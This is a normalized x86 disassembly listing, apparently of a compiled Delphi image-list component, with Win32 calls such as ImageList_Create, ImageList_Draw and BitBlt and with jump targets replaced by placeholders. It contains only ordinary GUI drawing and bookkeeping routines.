cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44a078
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_44a7b8
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_44ac80
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_415028
mov edi eax
mov eax esi
call sub_44db5c
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_44acac
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_44acf0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44ad15
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ad1c
retn
sub_44af68
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419380
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_44afb4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_419380
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_44b008
push ebx
push esi
push edi
call sub_4035f8
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413ab0
mov edx eax
mov eax edi
call sub_44bfd4
mov eax [ edi + 0x50 ]
call sub_40326c
mov eax edi
call sub_44b364
mov eax [ edi + 0x4c ]
call sub_40326c
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4193cc
test bl bl
jle r-xdata
call sub_40326c
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035e0
sub_44b074
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44b121
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_44bf5c
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_44b140
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b128
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_44b140
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44b1e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_42261c
mov eax ebx
call sub_421afc
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41ce60
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412594
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_421afc
pop edx
call sub_41d204
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b1e8
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_44b204
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_44b140
pop ecx
pop edx
pop ebx
retn
sub_44b23c
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_44b12c
test al al
je r-xdata
mov eax esi
call sub_44b8fc
mov eax esi
call sub_44b140
mov eax esi
mov si 0xffef
call sub_403468
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_44b280
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_44b12c
test al al
je r-xdata
mov eax esi
call sub_44b8fc
mov eax esi
call sub_44b140
mov eax esi
mov si 0xffef
call sub_403468
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_44b2c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b364
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44b204
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403468
sub_44b310
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44bee4
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_421b68
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44b364
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44b12c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403468
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_44b300
push eax
call ImageList_Destroy
sub_44b39c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44b42f
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_44b12c
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b436
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov edx eax
mov eax ebx
call sub_44b908
sub_44b43c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44b4eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44b4ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44b134
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44b310
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44b310
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b4d5
mov eax [ ebp - 0x10 ]
call sub_40326c
retn
sub_44b508
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44b607
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44b310
push eax
mov eax [ ebp - 0x4 ]
call sub_44b300
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b60e
mov eax [ ebp - 0xc ]
call sub_40326c
retn
cmp esi 0xffffffff
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44b5c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_4229c0
mov eax [ ebp - 0x4 ]
call sub_44b134
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44b2f0
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44b310
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40326c
retn
sub_44b624
push ebx
mov ebx eax
mov eax ebx
call sub_44b12c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44b300
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_44b648
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44b85f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44b12c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b866
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fe0
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44bee4
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44b508
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
xor eax eax
push ebp
push sub_44b810
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44b7f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44b7d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_42286c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_421afc
call sub_41d628
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44b300
push eax
call ImageList_Draw
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_421afc
call sub_41d628
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44b300
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_44b300
push eax
call ImageList_Replace
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b7da
mov eax [ ebp - 0x10 ]
call sub_40326c
retn
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
sub_44b870
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44b8ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44b624
cmp esi eax
jl r-xdata
mov eax ebx
call sub_44b12c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
mov eax ebx
mov si 0xffef
call sub_403468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b8f6
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
push esi
mov eax ebx
call sub_44b300
push eax
call ImageList_Remove
sub_44b908
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b12c
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_44af28
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403468
pop esi
pop ebx
retn
sub_44b940
push ebx
mov ebx eax
mov eax ebx
call sub_44b12c
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_44b300
push eax
call ImageList_GetBkColor
call sub_44af48
pop ebx
retn
sub_44b968
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_44b12c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_44af28
push eax
mov eax ebx
call sub_44b940
call sub_44af28
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_41d628
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44b300
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_421afc
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41ce60
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_412594
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_421afc
pop edx
call sub_41d204
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_421afc
call sub_41d628
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44b300
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_412594
mov eax [ ebx + 0x54 ]
call sub_421afc
call sub_41d628
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_41ce60
mov eax edi
call sub_41d628
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_41ce60
mov eax edi
call sub_41d628
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_42286c
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_44bb3c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_44bb60
pop ebx
pop ebp
retn 0xc
sub_44bb60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b12c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44bbac
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412594
mov eax [ ebp - 0x4 ]
call sub_44c840
xor eax eax
push ebp
push sub_44bd45
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44bd28
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44bd0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_42286c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bd12
mov eax [ ebp - 0x10 ]
call sub_40326c
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_421afc
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_41d204
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_41d628
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_421afc
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41d204
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_41d628
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44b43c
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_44bd54
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44b300
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_44bbac
sub_44bd74
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax ebx
call sub_44b364
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_413f84
mov eax ebx
call sub_44b8fc
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44bf5c
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_44b300
mov edx eax
mov eax ebx
call sub_44b204
mov eax ebx
call sub_44b12c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44b300
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44b134
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44b300
push eax
call ImageList_GetBkColor
call sub_44af48
mov edx eax
mov eax ebx
call sub_44b908
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_44bd54
jmp r-xdata
sub_44be34
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414068
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44bf5c
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_44b8fc
mov eax esi
call sub_44b300
mov edx eax
mov eax ebx
call sub_44b204
mov eax ebx
call sub_44b12c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44b300
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44b134
jmp r-xdata
mov eax esi
call sub_44b300
push eax
call ImageList_GetBkColor
call sub_44af48
mov edx eax
mov eax ebx
call sub_44b908
mov edx esi
mov eax ebx
call sub_44bd54
pop esi
pop ebx
retn
sub_44bee4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44bf50
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bf57
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_44bf84
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_4139c8
mov si 0xffff
call sub_403468
inc ebp
dec edi
jne r-xdata
sub_44bfd4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4138b8
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4139c8
cmp ebp eax
jne r-xdata
sub_44c02c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407bf4
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44c070
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_44b624
mov ebx eax
mov eax edi
call sub_44b624
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
